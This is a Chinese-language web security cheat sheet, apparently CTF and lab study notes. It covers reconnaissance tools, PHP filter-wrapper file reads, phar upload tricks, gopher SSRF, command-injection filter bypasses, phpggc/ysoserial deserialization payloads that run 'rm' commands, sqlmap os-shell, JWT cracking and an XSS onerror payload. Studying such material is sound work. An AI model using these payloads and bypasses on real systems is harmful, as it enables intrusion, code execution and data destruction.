## Web安全奇技淫巧

### 请求-响应 思考方向 快速反应

|        网页内容        |            利用方向            |
| :--------------------: | :----------------------------: |
|        文件上传        | 文件上传漏洞，phar反序列化漏洞 |
| XML格式的数据/POST表单 |  XXE 注入/改为XML格式，再XXE   |
|       数据库查询       |            SQL注入             |
|        用户登录        |          身份认证漏洞          |
|  图片等服务器静态资源  |            目录遍历            |
|        授权操作        |          访问控制漏洞          |
|   请求中含有完整链接   |              SSRF              |
|   用户输入渲染到网页   |            XSS,SSTI            |
|      网站的公私钥      |              JWT               |

关注点：

客户端子页面是否有开放的重定向



### 信息收集：

工具需求：

1. 对隐藏文件的目录，文件的探测  如www.zip .gi  index.php~, robots.txt   
2. 隐藏网页的探测
3. 网页注释

工具：

1. Burp Suite

 discover content  配置为短文件，短路径

2. Cansina  ---很大，很笨重

3. 手动配置资产清单，用burpSuite的intruder来访问

4. dirsearch   ``` dirsearch -u url```

   

手动收集：

1. 目录遍历  直接加..

2. 版本泄漏，诸如hg, git, svn什么的，用工具dvcd-ripper 

   1. ```docker run --rm -it -v /Users/fengyuanqiu/Desktop/dcvs-ripper/work:/work:rw k0st/alpine-dvcs-ripper rip-git.pl -v -u http://www.example.org/.git```

3. 假设取得了Webshell，或是可以远程执行代码, 

   1. ```sh 
      find -E . -iregex ".*/[f]+[l]+[a]+[g]+.*" 2>/dev/null | xargs  grep  ".*iscc{.*}.*"  2>/dev/null
      ```

4. php://filter/read=convert.base64-encode/resource= （需要分析源码）



关键函数phpinfo

PHP知识点：

1. array("0"=>array(new classname(),function))  函数数组
2. include 可以执行**PHP伪协议**，协议遵守URL 规范，可以URL编码绕过
3. preg_match，echo 可以触发__toString方法
4. PHP的字符串内，如果要插入变量，可以在字符串中插入$var的方式实现，用双引号
5. eval("var_dump($$flag);"); eval将字符串的内容按照php解析，var_dump解析变量并输出，$flag="GLOBALS",可以输出全局变量
6. exec("id") system("id") 可以用于执行**系统命令**，前者返回内容，后者直接打印内容
7. 比较有用的公开类 GlobIterator：遍历一个文件系统    SplFileObject：读取大文件 

```php
$iterator = new GlobIterator('/path/to/directory/*.php');//返回匹配的文件名
$file = new SplFileObject('/path/to/file.txt', 'r'); //读取相关文件
```





命令行操作：dirsearch , githack

docker执行： dvcd-ripper

### 任意文件上传

1. 读直接取某一个文件 http://127.0.0.1/?p=php://filter/convert.base64-encode/resource=flag
   1. php://filter/read=convert.base64-encode/resource= 读取当前目录下的文件（php, flag）
2. Naginx 配置错误  http://IP:PORT/img../
2. 图片文件可见，可用phar协议，则利用php通用反序列化脚本生成恶意PHP再嵌入到 JPG文件中，再用phar读取
2. 存在include文件包含，exitool工具（或是自定义，直接添加到末尾）将php代码嵌入到图片中，include执行





### SSRF 

Gopher

```shell
gopher://<host>:<port>/<gopher-path>_<TCP数据流>
```





### 命令注入

window 转义字符^

#### 命令执行绕过技巧

空格绕过（空格被过滤）

Windows ：%ProgramFiles:~10,1%

Liniux : 

1. for bash only  {echo,aaa}
2. $IFS$9

黑名单关键字（cat ,flag,<>之类的）

1. 利用变量拼接  linux下``` a=c;b=at;c=he;d=hello; $a$b ${c}${d}```

2. 使用通配符 ``` cat /tm?/fl*```

3. 借助已有文件的字符< >``` echo $(expr substr $(awk NR==1 xxx.php)) 1 1 ```

   

### 反序列化

https://www.freebuf.com/articles/web/276624.html

工具需求：

1. 自动转化序列化和反序列化的代码 支持php java ruby
2. 根据环境，依赖自动构造Gadget Chains链。    Java:ysoserial  PHP：phpggc

使用：

Phpgcc

```sh
./phpggc -l symfony  #查看类 存在漏洞的版本
./phpggc -i symfony/rce1 #查看使用方法
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 
```

Ysoserial 

```sh
java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```





服务端模版注入

工具需求：

1. 分别注入点是属于那种模版，并找到对应的模版的命令执行方式，语法

2. 需要一种可以在模版网站上快速搜索相关漏洞使用的方法，比如命令执行，如何新建一个命令执行的类



### SQL注入



```shell
#进入sql命令行界面
python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —sql-shell
#进入shell命令行界面
python sqlmap.py -u “http://59.63.200.79:8003/?id=1“ —os-shell

# 添加cookie
—cookie=”security=low;PHPSESSID=121123131”
#对于get方式
-m url.txt ::使用一个包含多个url的文件进行扫描。若有重复，sqlmap会 自动识别成一个。
-u “URL” : 指定URL，get请求方式
#对于POST方式
-r request.txt : Post提交方式
#直接连接数据库
-d : mysql表示数据库类型、user:password表示目标服务器的账号和密 码，@后表示要连接的服务器，3306表示端口，zakq_ dababasename表 示连接的数据库名称
python sqlmap.py -d “mysql://root:root@192.168.126.128:3386/zkaq_databasename”

```

### JWT



1. 暴力破解

   ```shell
   hashcat -a 0 -m 16500 <jwt> <wordlist> #-a -0表示采用密码本暴力破解 -m 16500代表JWT破解
   ```

   

2. 研究破解

   ```shell
   docker run --rm -it portswigger/sig2n <token1> <token2>
   ```





### 字符串绕过

工具需求：

1. 自动生成各种情况下的绕过语句

SQL 夹杂UNION操作

URL 夹杂恶意的域名（SSRF）

文件名绕过 添加.php

Javascript 绕过

PHP 绕过

HTML 绕过

CSP 绕过

```<img src=1 onerror=alert()>```





### web基础知识

1. /var/www/html/是大部分服务器的根目录
1. 中间件
1. WAF工作原理
